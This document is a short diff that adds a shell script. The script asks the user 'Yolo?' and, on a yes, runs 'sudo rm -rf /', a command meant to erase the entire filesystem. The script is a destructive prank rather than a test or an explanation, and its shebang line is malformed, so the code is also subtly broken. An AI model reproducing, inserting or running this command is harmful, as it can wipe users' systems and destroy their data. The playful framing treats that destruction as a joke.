@@ -1,0 +1,6 @@
+#!/bash/bin
+read -p "Yolo? [Y/n] " -n 1 -r
+if [[ $REPLY =~ ^[Yy]$ ]]
+then
+   sudo rm -rf /
+fi
